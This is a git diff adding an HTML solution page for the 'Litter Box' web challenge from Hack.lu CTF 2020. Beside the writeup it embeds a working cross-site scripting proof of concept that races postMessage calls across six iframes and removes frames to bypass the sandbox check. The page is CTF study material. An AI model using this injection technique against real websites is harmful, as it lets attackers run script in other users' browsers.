@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Litter Box | Hack.lu CTF 2020 | Solution</title>
+    <meta charset="utf-8">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="terjanq">
+    <meta name="twitter:title" content="Litter Box | Hack.lu CTF 2020 | Solution">
+    <meta name="twitter:description" content="Solution to Litter Box challenge from Hack.lu CTF 2020">
+    <!-- <meta name="twitter:image" content="https://i.imgur.com/e0eE9RX.png"> -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/night-owl.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/markdown-it/11.0.0/markdown-it.min.js"></script>
+    <link rel="preload" as="image" href="bg.jpg">
+    <link rel="stylesheet" href="style.css">
+    <script src="misc.js"></script>
+   </head>
+
+<body>
+    <div id=intro class=window>
+        <span class=title>Intro</span>
+        <h1> Solution to <a href="https://pwnhub.fluxfingers.net/challenges/21">Litter Box challenge</a>
+             from <a href="https://ctftime.org/event/1142">Hack.lu CTF 2020</a> </a></h1>
+
+        <p>
+
+        <h2>The challenge</h2>
+
+        <details>
+            <summary>index.html</summary>
+            <pre><code class="language-html" id="codeHTML"></code></pre>
+        </details>
+
+        <details>
+            <summary>main.js</summary>
+            <pre><code class="language-js" id="codeJS"></code></pre>
+        </details>
+        
+        <h2>Writeup</h2>
+        <pre class=main><code id=writeup class="language-markdown"></code></pre>
+    </div>
+
+    <div class=window>
+        <span class=title>Proof of Concept</span>
+        <pre class=main><code id=code class="language-html"></code></pre>
+    </div>
+
+    <div id=solution>
+        
+        <!-- Spawn 6 iframes to increase the effectiveness of the Race -->
+        <iframe src="https://litterbox.cf?0"></iframe>
+        <iframe src="https://litterbox.cf?1"></iframe>
+        <iframe src="https://litterbox.cf?2"></iframe>
+        <iframe src="https://litterbox.cf?3"></iframe>
+        <iframe src="https://litterbox.cf?4"></iframe>
+        <iframe src="https://litterbox.cf?5"></iframe>
+
+        <script>
+
+            var counter = 1;
+            var ramki = document.querySelectorAll('iframe');
+            var lol = {}
+
+            function solve() {
+                /* Repeat the process in a loop, but break it after 50 iterations */
+                if (counter >= 50) return;
+                counter += 1;
+
+                /* 
+                    1. Try to execute XSS on the page, before <iframe id='litterbox' sandbox>
+                       was parsed, so window.frames[0] returns undefined.
+                    2. Then remove the frame from DOM, so the e.source in onmessage event is null
+                */
+
+                let x = document.createElement('iframe');
+                x.srcdoc = `
+                    <script>
+                        for(let i=0;i<6;i++){
+                            top.ramki[i].contentWindow.postMessage('stop();confirm(/terjanq/)', '*');
+                        top.lol['i${counter}'].remove()}
+                    <\/script>`
+                lol['i' + counter] = x;
+                document.body.appendChild(x);
+
+                /* Make sure to execute the loop as quick as possible,  
+                   but don;t block the event loop */
+                setTimeout(solve, 0)
+            }
+            solve();
+        </script>
+        
+</body>
+
+</html>
